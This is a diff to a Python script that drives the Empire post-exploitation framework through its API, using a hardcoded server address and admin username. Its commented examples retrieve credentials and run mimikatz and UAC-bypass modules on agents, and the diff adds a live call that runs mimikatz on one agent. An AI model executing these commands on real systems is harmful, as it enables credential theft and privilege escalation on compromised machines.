@@ -9,11 +9,14 @@ api = EmpireAPIWrapper.empireAPI('10.15.20.157', uname='empireadmin', passwd='Pa
 # print(api.check_version())
 # print(api.shutdownServer())
 # print(api.restartServer())
-# print(api.getMap())
+# map = api.getMap()
 # print(api.getConfig())
 # print(api.getPermToken())
 # print(api.getCreds())
 
+##### Print API map out
+# for i in map:
+#     print(map[i])
 
 ##### Reporting
 # print(api.report())
@@ -28,7 +31,7 @@ api = EmpireAPIWrapper.empireAPI('10.15.20.157', uname='empireadmin', passwd='Pa
 # print(api.modules())
 # print(api.module_by_name('credentials/mimikatz/certs'))
 # data = {'Agent': 'all'}
-# print(api.exec_module('credentials/mimikatz/certs', options=data))
+# print(api.module_exec('credentials/mimikatz/certs', options=data))
 
 
 ##### Agents
@@ -39,4 +42,7 @@ api = EmpireAPIWrapper.empireAPI('10.15.20.157', uname='empireadmin', passwd='Pa
 #
 # agent_name = agent['agents'][0]['name']
 # data = {'Agent': agent_name, 'Listener': 'victor'}
-# print(api.exec_module('privesc/bypassuac', options=data))
+# print(api.module_exec('privesc/bypassuac', options=data))
+
+
+print(api.agent_run_shell_cmd('ZKRGK3Y2E2ZHTECE', {'command':'mimikatz'}))
